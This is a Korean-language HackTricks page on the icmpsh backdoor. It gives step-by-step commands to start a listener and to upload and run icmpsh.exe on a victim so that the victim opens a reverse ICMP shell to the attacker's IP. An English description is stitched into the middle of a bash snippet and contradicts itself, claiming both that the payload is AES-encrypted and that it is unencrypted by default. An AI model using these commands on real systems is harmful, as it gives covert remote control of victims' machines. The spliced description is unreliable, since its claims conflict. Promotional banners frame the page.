<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)를 **팔로우**하세요.
* **Hacking 트릭을 공유하려면** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.

</details>


[https://github.com/inquisb/icmpsh](https://github.com/inquisb/icmpsh)에서 백도어를 다운로드하세요.

# 클라이언트 측

스크립트를 실행하세요: **run.sh**

**오류가 발생하면 다음 줄을 변경해보세요:**
```bash
IPINT=$(ifconfig | grep "eth" | cut -d " " -f 1 | head -1)
IP=$(ifconfig "$IPINT" |grep "inet addr:" |cut -d ":" -f 2 |awk '{ print $1 }')
```
# ICMP Shell (icmpsh)

## Description

ICMP Shell (icmpsh) is a simple reverse ICMP shell that uses ICMP echo requests to establish a command shell on a target machine. It is a part of the [icmpsh](https://github.com/inquisb/icmpsh) project.

## Features

- Stealthy communication: ICMP echo requests are commonly allowed through firewalls and are less likely to be detected.
- Reverse shell: Allows an attacker to execute commands on the target machine.
- Encrypted communication: ICMP payload is encrypted using AES-128-CBC.
- Cross-platform: Works on Windows, Linux, and macOS.

## Usage

1. Start the listener on the attacker machine:

```shell
icmpsh.exe -l -v -d
```

2. Execute the client on the target machine:

```shell
icmpsh.exe -t <attacker_ip> -d
```

3. Once the connection is established, the attacker can execute commands on the target machine.

## Limitations

- Requires administrative privileges on the target machine.
- ICMP echo requests may be blocked by some firewalls or network configurations.
- The communication is not encrypted by default, but can be enabled using the `-e` option.

## Detection

- Monitor network traffic for ICMP echo requests to identify potential ICMP shell activity.
- Use intrusion detection systems (IDS) or network monitoring tools to detect suspicious ICMP traffic.
- Regularly update firewall rules to block ICMP echo requests if not required.

## References

- [icmpsh - GitHub](https://github.com/inquisb/icmpsh)
```bash
echo Please insert the IP where you want to listen
read IP
```
# **피해자 측**

피해자에게 **icmpsh.exe**를 업로드하고 실행하세요:
```bash
icmpsh.exe -t <Attacker-IP> -d 500 -b 30 -s 128
```
<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)를 **팔로우**하세요.
* **Hacking 트릭을 공유하려면** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.

</details>
